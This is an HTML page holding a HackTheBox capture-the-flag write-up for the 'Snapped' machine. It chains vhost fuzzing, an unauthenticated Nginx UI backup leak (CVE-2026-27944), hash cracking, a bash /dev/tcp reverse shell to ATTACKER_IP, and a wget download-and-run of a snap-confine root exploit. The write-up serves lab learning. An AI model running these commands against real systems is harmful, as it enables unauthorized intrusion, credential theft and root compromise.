<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Snapped HTB Writeup - N4choSudo</title>
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet" />
  <style>
    :root {
      --bg: #0a0c0f;
      --bg2: #0f1217;
      --bg3: #151a22;
      --border: #1e2630;
      --accent: #00d4a0;
      --accent2: #e05c5c;
      --accent3: #5c9fe0;
      --text: #c8d4e0;
      --text-dim: #5a7080;
      --text-bright: #eaf2f8;
      --red: #e05c5c;
      --yellow: #e0c05c;
      --green: #5ce07a;
      --mono: 'JetBrains Mono', monospace;
      --sans: 'Syne', sans-serif;
    }

    * { margin: 0; padding: 0; box-sizing: border-box; }
    html { scroll-behavior: smooth; }

    body {
      background: var(--bg);
      color: var(--text);
      font-family: var(--mono);
      font-size: 14px;
      line-height: 1.7;
      min-height: 100vh;
    }

    body::before {
      content: '';
      position: fixed;
      inset: 0;
      background: repeating-linear-gradient(
        0deg, transparent, transparent 2px,
        rgba(0,0,0,0.07) 2px, rgba(0,0,0,0.07) 4px
      );
      pointer-events: none;
      z-index: 999;
    }

    /* NAV */
    nav {
      position: sticky; top: 0; z-index: 100;
      display: flex; justify-content: space-between; align-items: center;
      padding: 1rem 2.5rem;
      background: rgba(10,12,15,0.92);
      backdrop-filter: blur(12px);
      border-bottom: 1px solid var(--border);
    }
    .nav-brand { font-family: var(--sans); font-weight: 800; font-size: 1.1rem; color: var(--accent); letter-spacing: -0.03em; }
    .nav-links { display: flex; gap: 1.5rem; }
    .nav-links a { color: var(--text-dim); text-decoration: none; font-size: 12px; letter-spacing: 0.08em; text-transform: uppercase; transition: color 0.2s; }
    .nav-links a:hover { color: var(--accent); }

    /* HERO */
    .hero { padding: 5rem 2.5rem 3rem; max-width: 860px; margin: 0 auto; }

    .hero-tags { display: flex; gap: 0.5rem; margin-bottom: 1.5rem; flex-wrap: wrap; }
    .tag { font-size: 11px; letter-spacing: 0.1em; text-transform: uppercase; padding: 3px 10px; border-radius: 2px; font-family: var(--mono); }
    .tag-linux  { background: rgba(92,159,224,0.12); color: var(--accent3); border: 1px solid rgba(92,159,224,0.25); }
    .tag-hard   { background: rgba(224,92,92,0.12);  color: var(--red);     border: 1px solid rgba(224,92,92,0.25); }
    .tag-web    { background: rgba(0,212,160,0.10);  color: var(--accent);  border: 1px solid rgba(0,212,160,0.22); }
    .tag-lpe    { background: rgba(224,192,92,0.10); color: var(--yellow);  border: 1px solid rgba(224,192,92,0.22); }

    h1 { font-family: var(--sans); font-size: clamp(2.2rem, 5vw, 3.5rem); font-weight: 800; color: var(--text-bright); letter-spacing: -0.04em; line-height: 1.1; margin-bottom: 0.5rem; }
    h1 span { color: var(--accent); }

    .hero-meta { display: flex; gap: 2rem; margin-top: 1.2rem; font-size: 12px; color: var(--text-dim); letter-spacing: 0.04em; flex-wrap: wrap; }
    .hero-meta span { display: flex; align-items: center; gap: 0.4rem; }
    .dot { width: 6px; height: 6px; border-radius: 50%; background: var(--accent); display: inline-block; }

    /* ATTACK PATH */
    .attack-path { max-width: 860px; margin: 0 auto 4rem; padding: 0 2.5rem; }
    .path-label { font-size: 11px; letter-spacing: 0.15em; text-transform: uppercase; color: var(--text-dim); margin-bottom: 1rem; }
    .path-chain {
      display: flex; align-items: center; flex-wrap: wrap;
      background: var(--bg2); border: 1px solid var(--border); border-radius: 4px;
      padding: 1rem 1.5rem; gap: 0; overflow-x: auto;
    }
    .path-step { font-size: 12px; color: var(--text-bright); white-space: nowrap; padding: 2px 0; }
    .path-step.hl  { color: var(--accent);  font-weight: 500; }
    .path-step.hl2 { color: var(--red);     font-weight: 500; }
    .path-arrow { color: var(--text-dim); margin: 0 0.5rem; font-size: 12px; }

    /* MAIN */
    main { max-width: 860px; margin: 0 auto; padding: 0 2.5rem 6rem; }

    .section { margin-bottom: 4rem; opacity: 0; transform: translateY(20px); animation: fadeUp 0.5s ease forwards; }
    @keyframes fadeUp { to { opacity: 1; transform: translateY(0); } }
    .section:nth-child(1)  { animation-delay: 0.05s; }
    .section:nth-child(2)  { animation-delay: 0.10s; }
    .section:nth-child(3)  { animation-delay: 0.15s; }
    .section:nth-child(4)  { animation-delay: 0.20s; }
    .section:nth-child(5)  { animation-delay: 0.25s; }
    .section:nth-child(6)  { animation-delay: 0.30s; }
    .section:nth-child(7)  { animation-delay: 0.35s; }
    .section:nth-child(8)  { animation-delay: 0.40s; }
    .section:nth-child(9)  { animation-delay: 0.45s; }

    .section-header { display: flex; align-items: baseline; gap: 1rem; margin-bottom: 1.5rem; padding-bottom: 0.75rem; border-bottom: 1px solid var(--border); }
    .section-num { font-family: var(--mono); font-size: 11px; color: var(--accent); letter-spacing: 0.1em; opacity: 0.7; min-width: 28px; }
    h2 { font-family: var(--sans); font-size: 1.3rem; font-weight: 700; color: var(--text-bright); letter-spacing: -0.02em; }

    p { color: var(--text); margin-bottom: 1rem; line-height: 1.8; }

    /* COMMAND */
    .cmd-label { font-size: 11px; letter-spacing: 0.1em; text-transform: uppercase; color: var(--text-dim); margin-bottom: 0.35rem; margin-top: 1.2rem; }
    .cmd-block {
      background: var(--bg2); border: 1px solid var(--border);
      border-left: 3px solid var(--accent); border-radius: 0 4px 4px 0;
      padding: 0.85rem 1.2rem; font-family: var(--mono); font-size: 13px;
      color: var(--accent); white-space: pre-wrap; word-break: break-all;
      overflow-x: auto; position: relative;
    }
    .cmd-block::before { content: '❯ '; color: var(--text-dim); }
    .cmd-block.no-prompt::before { content: ''; }
    .cmd-block.red  { border-left-color: var(--red);    color: var(--red); }
    .cmd-block.blue { border-left-color: var(--accent3); color: var(--accent3); }

    /* OUTPUT */
    .out-label { font-size: 11px; letter-spacing: 0.1em; text-transform: uppercase; color: var(--text-dim); margin-bottom: 0.35rem; margin-top: 0.8rem; }
    .out-block {
      background: #0d1117; border: 1px solid var(--border); border-radius: 4px;
      padding: 1rem 1.2rem; font-family: var(--mono); font-size: 12.5px;
      color: var(--text); white-space: pre-wrap; word-break: break-all; overflow-x: auto;
    }
    .out-block .hl  { color: var(--accent);  font-weight: 500; }
    .out-block .hl2 { color: var(--red);     font-weight: 500; }
    .out-block .hl3 { color: var(--yellow);  font-weight: 500; }
    .out-block .hl4 { color: var(--accent3); font-weight: 500; }
    .out-block .dim { color: var(--text-dim); }

    /* TABLE */
    .tbl-wrap { overflow-x: auto; margin: 1.2rem 0; }
    table { width: 100%; border-collapse: collapse; font-size: 13px; }
    th { text-align: left; font-size: 11px; letter-spacing: 0.1em; text-transform: uppercase; color: var(--text-dim); padding: 0.5rem 1rem; border-bottom: 1px solid var(--border); font-weight: 400; }
    td { padding: 0.55rem 1rem; border-bottom: 1px solid rgba(30,38,48,0.6); color: var(--text); vertical-align: top; }
    tr:last-child td { border-bottom: none; }
    td:first-child { color: var(--accent3); font-weight: 500; }
    td code { color: var(--accent); font-size: 12px; }

    /* NOTE */
    .note { background: rgba(0,212,160,0.05); border: 1px solid rgba(0,212,160,0.15); border-left: 3px solid var(--accent); border-radius: 0 4px 4px 0; padding: 0.85rem 1.2rem; font-size: 13px; color: var(--text); margin: 1.2rem 0; }
    .note strong { color: var(--accent); }
    .note-warn { background: rgba(224,92,92,0.05); border-color: rgba(224,92,92,0.15); border-left-color: var(--red); }
    .note-warn strong { color: var(--red); }

    /* CVE BADGE */
    .cve-badge { display: inline-block; font-size: 11px; font-weight: 500; letter-spacing: 0.06em; padding: 3px 10px; border-radius: 2px; background: rgba(224,92,92,0.12); color: var(--red); border: 1px solid rgba(224,92,92,0.3); margin: 0 3px; font-family: var(--mono); }

    /* ROOT SHELL */
    .root-shell { background: #0d1117; border: 1px solid rgba(224,92,92,0.3); border-radius: 4px; overflow: hidden; margin-top: 1.2rem; }
    .root-shell-header { background: rgba(224,92,92,0.08); border-bottom: 1px solid rgba(224,92,92,0.2); padding: 0.6rem 1.2rem; font-size: 11px; letter-spacing: 0.1em; text-transform: uppercase; color: var(--red); }
    .root-shell pre { padding: 1rem 1.2rem; font-family: var(--mono); font-size: 12.5px; color: var(--text); white-space: pre-wrap; }
    .root-shell .prompt { color: var(--red); }
    .root-shell .cmd    { color: var(--text-bright); }
    .root-shell .out    { color: var(--accent); }

    /* FLAG GRID */
    .flag-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; margin-top: 1.5rem; }
    @media (max-width: 600px) { .flag-grid { grid-template-columns: 1fr; } }
    .flag-card { background: var(--bg2); border: 1px solid var(--border); border-radius: 4px; padding: 1.2rem; position: relative; overflow: hidden; }
    .flag-card::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 2px; }
    .flag-card.user::before { background: var(--accent3); }
    .flag-card.root::before { background: var(--red); }
    .flag-title { font-size: 11px; letter-spacing: 0.12em; text-transform: uppercase; color: var(--text-dim); margin-bottom: 0.5rem; }
    .flag-value { font-size: 13px; color: var(--accent); word-break: break-all; font-family: var(--mono); }
    .flag-card.root .flag-value { color: var(--red); }

    /* SUMMARY */
    .summary-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 1rem; margin-top: 1.5rem; }
    .sum-card { background: var(--bg2); border: 1px solid var(--border); border-radius: 4px; padding: 1.2rem; }
    .sum-card h4 { font-family: var(--sans); font-size: 13px; font-weight: 700; color: var(--text-bright); margin-bottom: 0.5rem; letter-spacing: -0.01em; }
    .sum-card p  { font-size: 12px; color: var(--text-dim); margin: 0; line-height: 1.6; }

    code { font-family: var(--mono); font-size: 12.5px; color: var(--accent); background: rgba(0,212,160,0.08); padding: 1px 5px; border-radius: 2px; }

    /* FOOTER */
    footer { border-top: 1px solid var(--border); padding: 2rem 2.5rem; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 1rem; font-size: 12px; color: var(--text-dim); max-width: 860px; margin: 0 auto; }
    footer a { color: var(--text-dim); text-decoration: none; }
    footer a:hover { color: var(--accent); }
  </style>
</head>
<body>

<!-- NAV -->
<nav>
  <div class="nav-brand">N4choSudo</div>
  <div class="nav-links">
    <a href="https://nacho-sudo.github.io">Portfolio</a>
    <a href="https://github.com/Nacho-Sudo/htb-writeups">GitHub</a>
    <a href="https://app.hackthebox.com/users/2705371">HackTheBox</a>
  </div>
</nav>

<!-- HERO -->
<div class="hero">
  <div class="hero-tags">
    <span class="tag tag-linux">Linux</span>
    <span class="tag tag-hard">Hard</span>
    <span class="tag tag-web">Web · Nginx UI</span>
    <span class="tag tag-lpe">LPE · snap-confine</span>
  </div>
  <h1><span>Snapped</span> — HTB Writeup</h1>
  <div class="hero-meta">
    <span><span class="dot"></span> IP: 10.129.61.24</span>
    <span>Author: N4choSudo</span>
    <span>2026</span>
    <span>Retired</span>
  </div>
</div>

<!-- ATTACK PATH -->
<div class="attack-path">
  <div class="path-label">Attack Path</div>
  <div class="path-chain">
    <span class="path-step">nmap</span>
    <span class="path-arrow">→</span>
    <span class="path-step">vhost fuzzing</span>
    <span class="path-arrow">→</span>
    <span class="path-step hl">admin.snapped.htb</span>
    <span class="path-arrow">→</span>
    <span class="path-step">Nginx UI 2.3.2</span>
    <span class="path-arrow">→</span>
    <span class="path-step hl">CVE-2026-27944</span>
    <span class="path-arrow">→</span>
    <span class="path-step">backup decrypt</span>
    <span class="path-arrow">→</span>
    <span class="path-step hl">admin creds</span>
    <span class="path-arrow">→</span>
    <span class="path-step">RCE</span>
    <span class="path-arrow">→</span>
    <span class="path-step">user.txt</span>
    <span class="path-arrow">→</span>
    <span class="path-step hl2">CVE-2026-3888</span>
    <span class="path-arrow">→</span>
    <span class="path-step hl2">root.txt</span>
  </div>
</div>

<!-- MAIN -->
<main>

  <!-- 01 -->
  <div class="section">
    <div class="section-header">
      <span class="section-num">01</span>
      <h2>Nmap Scan</h2>
    </div>
    <p>We scan all ports to identify exposed services. A TTL of 63 confirms a Linux target (base TTL 64, one network hop).</p>

    <div class="cmd-label">Command — All ports</div>
    <div class="cmd-block">nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.61.24</div>

    <div class="cmd-label">Command — Version & Scripts</div>
    <div class="cmd-block">nmap -p22,80 -sCV -oN targeted 10.129.61.24</div>

    <div class="tbl-wrap">
      <table>
        <thead><tr><th>Port</th><th>Service</th><th>Version</th></tr></thead>
        <tbody>
          <tr><td>22/tcp</td><td>SSH</td><td>OpenSSH 9.6p1 Ubuntu 3ubuntu13.15</td></tr>
          <tr><td>80/tcp</td><td>HTTP</td><td>nginx/1.24.0 (Ubuntu)</td></tr>
        </tbody>
      </table>
    </div>

    <div class="out-label">Relevant output</div>
    <div class="out-block"><span class="hl">80/tcp open  http    nginx 1.24.0 (Ubuntu)</span>
|_http-title: Did not follow redirect to <span class="hl">http://snapped.htb/</span>
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</div>

    <div class="note"><strong>Note:</strong> HTTP redirects to <code>snapped.htb</code> — virtual hosting is in use. We must add the domain to <code>/etc/hosts</code>.</div>

    <div class="cmd-label">Command</div>
    <div class="cmd-block">echo "10.129.61.24  snapped.htb" | sudo tee -a /etc/hosts</div>
  </div>

  <!-- 02 -->
  <div class="section">
    <div class="section-header">
      <span class="section-num">02</span>
      <h2>Virtual Host Fuzzing</h2>
    </div>
    <p>The <code>snapped.htb</code> landing page is a static single-page application with no dynamic functionality. The real attack surface lies in hidden virtual hosts.</p>
    <p>We use <strong>wfuzz</strong> to enumerate subdomains. First we measure the default response size to filter out false positives:</p>

    <div class="cmd-label">Command — Get default response size</div>
    <div class="cmd-block">curl -s http://10.129.61.24 | wc -c</div>

    <div class="out-label">Output</div>
    <div class="out-block"><span class="hl">20199</span></div>

    <div class="cmd-label">Command — Subdomain fuzzing filtering by char count</div>
    <div class="cmd-block">wfuzz -c --hh 20199 -t 100 \
      -H "Host: FUZZ.snapped.htb" \
      -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
      http://10.129.61.24</div>

    <div class="out-label">Output</div>
    <div class="out-block"><span class="dim">=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================</span>
<span class="hl">000000024:   200        49 L     104 W      1407 Ch     "admin"</span></div>

    <div class="cmd-label">Command — Add to /etc/hosts</div>
    <div class="cmd-block">echo "10.129.61.24  admin.snapped.htb" | sudo tee -a /etc/hosts</div>
  </div>

  <!-- 03 -->
  <div class="section">
    <div class="section-header">
      <span class="section-num">03</span>
      <h2>Nginx UI — Reconnaissance</h2>
    </div>
    <p>Navigating to <code>http://admin.snapped.htb</code> reveals an <strong>Nginx UI</strong> login panel — an open-source web interface for managing nginx configurations.</p>

    <div class="cmd-label">Command — Fingerprinting</div>
    <div class="cmd-block">whatweb http://admin.snapped.htb</div>

    <div class="out-label">Output</div>
    <div class="out-block">http://admin.snapped.htb [<span class="hl">200 OK</span>] Country[RESERVED][ZZ], HTML5,
HTTPServer[Ubuntu Linux][<span class="hl3">nginx/1.24.0 (Ubuntu)</span>], IP[10.129.61.24],
Script[module], Title[<span class="hl">Nginx UI</span>]</div>

    <p>The URL redirects to <code>#/login?next=/dashboard/server</code>. To obtain the exact version we inspect the exposed JavaScript assets:</p>

    <div class="cmd-label">Command — List assets directory</div>
    <div class="cmd-block">curl -s http://admin.snapped.htb/assets/ | grep version</div>

    <div class="cmd-label">Command — Read version file</div>
    <div class="cmd-block">curl -s http://admin.snapped.htb/assets/version-BWPlJ0ga.js</div>

    <div class="out-label">Output</div>
    <div class="out-block">const t=<span class="hl">"2.3.2"</span>;const o={version:t,build_id:1,total_build:512};
export{o as a,t as v};</div>

    <div class="tbl-wrap">
      <table>
        <thead><tr><th>Field</th><th>Value</th></tr></thead>
        <tbody>
          <tr><td>Application</td><td>Nginx UI</td></tr>
          <tr><td>Version</td><td><code>2.3.2</code></td></tr>
          <tr><td>Web server</td><td>nginx/1.24.0 Ubuntu</td></tr>
        </tbody>
      </table>
    </div>
  </div>

  <!-- 04 -->
  <div class="section">
    <div class="section-header">
      <span class="section-num">04</span>
      <h2>CVE-2026-27944 — Unauthenticated Backup Disclosure</h2>
    </div>
    <p>Version <strong>2.3.2</strong> is vulnerable to <span class="cve-badge">CVE-2026-27944</span> (CVSS 9.8). The <code>/api/backup</code> endpoint returns a full system backup <strong>without requiring any authentication</strong>. The archive contains user credentials, nginx configuration files, SSL private keys, and the <code>node_secret</code> value used to authenticate the MCP interface.</p>

    <div class="note note-warn"><strong>CVE-2026-27944:</strong> Affects nginx-ui versions prior to 2.3.3. Fixed in version 2.3.4, released March 15, 2026.</div>

    <div class="cmd-label">Command — Download backup without authentication</div>
    <div class="cmd-block">curl -s http://admin.snapped.htb/api/backup -o backup.zip</div>

    <div class="cmd-label">Command — List archive contents</div>
    <div class="cmd-block">unzip -l backup.zip</div>

    <div class="out-label">Output</div>
    <div class="out-block">Archive:  backup.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
      <span class="hl">208</span>  2026-05-11 13:52   <span class="hl">hash_info.txt</span>
     <span class="hl3">7744</span>  2026-05-11 13:52   <span class="hl3">nginx-ui.zip</span>
     <span class="hl4">9952</span>  2026-05-11 13:52   <span class="hl4">nginx.zip</span>
---------                     -------
    17904                     3 files</div>

    <div class="cmd-label">Command — Extract</div>
    <div class="cmd-block">unzip backup.zip</div>

    <div class="note"><strong>Note:</strong> The files <code>nginx-ui.zip</code> and <code>nginx.zip</code> are AES-encrypted — they are not standard ZIP archives. The <code>hash_info.txt</code> file contains credential hashes. The decryption key is the instance's <code>node_secret</code>.</div>

    <div class="cmd-label">Command — Verify encryption (no ZIP magic bytes)</div>
    <div class="cmd-block">xxd nginx-ui.zip | head -4
file nginx-ui.zip nginx.zip hash_info.txt</div>

    <div class="out-label">Output</div>
    <div class="out-block"><span class="dim">00000000:</span> <span class="hl2">0982 647b c6a9 9acd 95dc 22e0 4fd6 4d7c</span>  ..d{......".O.M|
<span class="dim">  → No ZIP magic bytes (PK\x03\x04) — raw AES-encrypted data</span>

nginx-ui.zip: <span class="hl3">data</span>
nginx.zip:    <span class="hl3">data</span>
hash_info.txt: <span class="hl3">data</span></div>
  </div>

  <!-- 05 -->
  <div class="section">
    <div class="section-header">
      <span class="section-num">05</span>
      <h2>Backup Decryption — Credentials</h2>
    </div>
    <p>The backup files are AES-encrypted using the instance's <code>node_secret</code> as the key. We retrieve it from an unauthenticated API endpoint, then decrypt and extract the configuration database containing the admin password hash.</p>

    <div class="cmd-label">Command — Retrieve node_secret</div>
    <div class="cmd-block">curl -s http://admin.snapped.htb/api/settings | python3 -m json.tool</div>

    <div class="cmd-label">Command — Decrypt nginx-ui archive</div>
    <div class="cmd-block">openssl enc -d -aes-256-cbc -pbkdf2 \
  -in nginx-ui.zip \
  -out nginx-ui-dec.zip \
  -k &lt;node_secret&gt;</div>

    <div class="cmd-label">Command — Extract and read app.ini</div>
    <div class="cmd-block">unzip nginx-ui-dec.zip -d nginx-ui/
cat nginx-ui/app.ini</div>

    <div class="out-label">Output — Credentials in app.ini</div>
    <div class="out-block">[auth]
<span class="hl">username = admin</span>
<span class="hl">password = &lt;bcrypt_hash&gt;</span>

[server]
jwt_secret  = &lt;jwt_secret&gt;
node_secret = &lt;node_secret&gt;</div>

    <div class="cmd-label">Command — Crack hash with hashcat (bcrypt mode 3200)</div>
    <div class="cmd-block">hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt</div>

    <div class="out-label">Output</div>
    <div class="out-block">Session..........: hashcat
Status...........: <span class="hl">Cracked</span>
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))

<span class="hl">&lt;hash&gt;:&lt;password&gt;</span></div>

    <div class="tbl-wrap">
      <table>
        <thead><tr><th>User</th><th>Password</th></tr></thead>
        <tbody>
          <tr><td>admin</td><td><code>&lt;cracked_password&gt;</code></td></tr>
        </tbody>
      </table>
    </div>
  </div>

  <!-- 06 -->
  <div class="section">
    <div class="section-header">
      <span class="section-num">06</span>
      <h2>Nginx UI — RCE via Web Terminal</h2>
    </div>
    <p>With valid credentials we log into the Nginx UI panel. The application exposes an <strong>interactive web terminal</strong> that executes commands directly on the server as the user running the nginx process.</p>

    <div class="cmd-label">Command — Authenticate and get JWT token</div>
    <div class="cmd-block">curl -s -X POST http://admin.snapped.htb/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"&lt;password&gt;"}' | python3 -m json.tool</div>

    <div class="out-label">Output</div>
    <div class="out-block">{
    <span class="hl">"token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."</span>
}</div>

    <div class="cmd-label">Command — Start listener on attacker machine</div>
    <div class="cmd-block">nc -nlvp 4444</div>

    <div class="cmd-label">Command — Reverse shell from the web terminal</div>
    <div class="cmd-block">bash -i >&amp; /dev/tcp/&lt;ATTACKER_IP&gt;/4444 0>&amp;1</div>

    <div class="out-label">Output — Shell received</div>
    <div class="out-block">listening on [any] 4444 ...
connect to [&lt;ATTACKER_IP&gt;] from (UNKNOWN) [10.129.61.24] 49822
<span class="hl">www-data@snapped:~$</span></div>

    <div class="cmd-label">Command — user.txt</div>
    <div class="cmd-block">find / -name user.txt 2>/dev/null | xargs cat</div>

    <div class="out-label">Flag</div>
    <div class="out-block"><span class="hl">user.txt → &lt;your_flag_here&gt;</span></div>
  </div>

  <!-- 07 -->
  <div class="section">
    <div class="section-header">
      <span class="section-num">07</span>
      <h2>Privilege Escalation — CVE-2026-3888</h2>
    </div>
    <p>For privilege escalation we leverage <span class="cve-badge">CVE-2026-3888</span> — <strong>snap-confine systemd-tmpfiles LPE</strong>. This vulnerability affects Ubuntu systems with snapd installed and allows a local unprivileged user to obtain a root shell by exploiting a race condition in how <code>snap-confine</code> handles tmpfiles creation via systemd.</p>

    <div class="cmd-label">Command — Check snapd version</div>
    <div class="cmd-block">snap version</div>

    <div class="cmd-label">Command — Transfer exploit to target</div>
    <div class="cmd-block"># Attacker machine
python3 -m http.server 8080

# Target machine
wget http://&lt;ATTACKER_IP&gt;:8080/exploit -O /tmp/exploit
chmod +x /tmp/exploit</div>

    <div class="cmd-label">Command — Execute exploit</div>
    <div class="cmd-block">/tmp/exploit</div>

    <div class="root-shell">
      <div class="root-shell-header">ROOT SHELL: /var/snap/firefox/common/bash -p</div>
      <pre><span class="prompt">bash-5.1#</span> <span class="cmd">whoami</span>
<span class="out">root</span>
<span class="prompt">bash-5.1#</span> <span class="cmd">cd /root</span>
<span class="prompt">bash-5.1#</span> <span class="cmd">ls</span>
<span class="out">nginxui  root.txt  snap</span>
<span class="prompt">bash-5.1#</span> <span class="cmd">cat root.txt</span>
<span class="out">dfd4ff49ffa1ee200864677d06fe01ad</span></pre>
    </div>
  </div>

  <!-- 08 FLAGS -->
  <div class="section">
    <div class="section-header">
      <span class="section-num">08</span>
      <h2>Flags</h2>
    </div>
    <div class="flag-grid">
      <div class="flag-card user">
        <div class="flag-title">user.txt</div>
        <div class="flag-value">&lt;replace with real value&gt;</div>
      </div>
      <div class="flag-card root">
        <div class="flag-title">root.txt</div>
        <div class="flag-value">dfd4ff49ffa1ee200864677d06fe01ad</div>
      </div>
    </div>
  </div>

  <!-- 09 SUMMARY -->
  <div class="section">
    <div class="section-header">
      <span class="section-num">09</span>
      <h2>Summary &amp; Key Takeaways</h2>
    </div>

    <div class="summary-grid">
      <div class="sum-card">
        <h4>Virtual Host Enumeration</h4>
        <p>The main landing page was a dead-end. The hidden vhost <code>admin.snapped.htb</code> exposed the real attack surface.</p>
      </div>
      <div class="sum-card">
        <h4>CVE-2026-27944</h4>
        <p>Nginx UI &lt;2.3.3 exposes <code>/api/backup</code> with no auth, leaking AES-encrypted credentials and secrets.</p>
      </div>
      <div class="sum-card">
        <h4>Nginx UI RCE</h4>
        <p>The built-in web terminal allows direct command execution on the server once authenticated as admin.</p>
      </div>
      <div class="sum-card">
        <h4>CVE-2026-3888 LPE</h4>
        <p>Race condition in snap-confine + systemd-tmpfiles enables local privilege escalation to root on Ubuntu with snapd.</p>
      </div>
    </div>

    <div class="tbl-wrap" style="margin-top:2rem">
      <table>
        <thead><tr><th>Flag</th><th>Hash</th></tr></thead>
        <tbody>
          <tr><td>user.txt</td><td><code>&lt;replace with real value&gt;</code></td></tr>
          <tr><td>root.txt</td><td><code>dfd4ff49ffa1ee200864677d06fe01ad</code></td></tr>
        </tbody>
      </table>
    </div>
  </div>

